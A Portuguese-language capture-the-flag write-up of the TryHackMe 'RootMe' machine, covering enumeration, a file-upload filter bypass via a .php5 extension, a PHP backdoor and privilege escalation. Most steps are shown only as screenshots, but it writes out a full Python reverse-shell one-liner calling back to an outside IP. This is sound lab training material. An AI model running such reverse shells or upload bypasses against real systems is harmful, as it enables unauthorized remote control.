# RootMe

# Dificuldade : Fácil

<h1>Dessa vez um CTF de dificuldade fácil, porém, diria que é essencial pra entender o processo de bypass file upload.</h1>

A maquina [RootMe](https://tryhackme.com/room/rrootme) tem foco em web-security, Linux exploration, and Privilege Escalation

## Enumeração

![Nmap Resultado](https://user-images.githubusercontent.com/32500664/142517453-fc77cdbb-275c-48a1-925c-5efbcad1c6ed.png)


# Porta 80

![SitePanel2](https://user-images.githubusercontent.com/32500664/142517480-59322c9d-925d-4a74-9a0a-aca0c49ca93d.png)

# Directory fuzzing

![fuufResult](https://user-images.githubusercontent.com/32500664/142517501-c73e2c23-bfdb-4b62-ba1f-21582173fb23.png)

# Upload Reverse shell Script

<h4>Tentando upar script backdoor em PHP</h4>

**Pesquisando formas de "Bypassar" esse arquivo no [Hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload)**

![ListaBypass](https://user-images.githubusercontent.com/32500664/142534496-e4b45797-bd9b-47bb-a59a-17c1cf4ef28f.png)

<h4>Mudando extensão e upando script</h4>

![shellzinha](https://user-images.githubusercontent.com/32500664/142519820-82eaf5c6-38ab-409f-b3d5-212fe2745198.png)

![5-php5](https://user-images.githubusercontent.com/32500664/142520719-46b85125-d397-4d1c-96ac-96c95983c029.png)

![foi](https://user-images.githubusercontent.com/32500664/142519919-15e4bd42-fa8e-49f3-93dc-098d6b4f9425.png)

![FUNCIONA](https://user-images.githubusercontent.com/32500664/142519962-2134cae5-690a-4680-bbd6-437e4292a628.png)

<h2> Com o script funcionando vamos verificar se a maquina roda python e se sim finalmente rodar o comando da reverse shell </h2>

![Python3Veri](https://user-images.githubusercontent.com/32500664/142526677-9f7dedeb-4934-495a-b11a-eb99b8c786d5.png)

Python presente!!

![CriandoShell](https://user-images.githubusercontent.com/32500664/142527323-dcee4a7f-660e-4a55-a919-a99d3874ab57.png)

Se conectando á IP-da-maquina/uploads/simple-backdoor.php5?cmd={REVERSE-SHELL-SCRIPT}

> O script que eu usei foi --- python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.82.32",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

![Oia a shell ai](https://user-images.githubusercontent.com/32500664/142528324-a329bbd8-29d5-453b-8185-58e7bf28ed0a.png)

Normalmente a user flag fica na home de um usuário comum da maquina, mas... cade ?

# Encontrando e capturando a user flag
Utilizando o comando [find / -type f -name user.txt] para encontrar e capturar a flag.

![Inkedfind_LI](https://user-images.githubusercontent.com/32500664/142541783-61212da6-7692-4b8d-a264-69d69bfe49aa.jpg)

# Escalando privilégios

![AbrindoServerHttp](https://user-images.githubusercontent.com/32500664/142542700-7abaf116-5ad0-4625-af6a-1122f39bf803.png)

![ComandoLinpeas](https://user-images.githubusercontent.com/32500664/142542775-5c6cb03f-c98d-44ae-99d5-5e1e83f0fafc.png)

![InkedSetáDestacadoÉporqÉimportante_LI](https://user-images.githubusercontent.com/32500664/142543063-eb46b6e3-9204-452b-b8cb-50a1be8c67fc.jpg)

![GtfoPyt](https://user-images.githubusercontent.com/32500664/142547118-2f7c6186-a328-416c-89da-cd327e43a4c4.png)

<h4>Lendo Root flag</h4>

![0_bYLorplRkDHoTjoa](https://user-images.githubusercontent.com/32500664/142551835-a07f5505-c8c4-4ba6-8b2c-2272f9ce872e.png)

